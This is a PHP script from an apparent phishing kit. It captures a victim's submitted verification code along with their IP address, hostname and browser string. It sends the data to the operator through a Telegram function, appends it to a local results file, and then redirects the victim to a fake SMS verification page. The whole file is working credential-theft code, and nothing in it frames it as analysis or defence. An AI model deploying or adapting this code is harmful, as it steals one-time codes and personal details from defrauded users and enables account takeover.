<?php
require_once '../ventro/zabiosobi.php';
$ip = getenv("REMOTE_ADDR");
$message .= "---1/2/LAWLAPAGIX---\n";
$message .= "mosta3mellhatefranakh    	 : ".$_POST['ARMAGEDON']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------LKHRA/1/1------------\n";
telegram_send(urlencode($message));
$fp = fopen('../alresult.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: ../ruenan/sms_verif.html");?>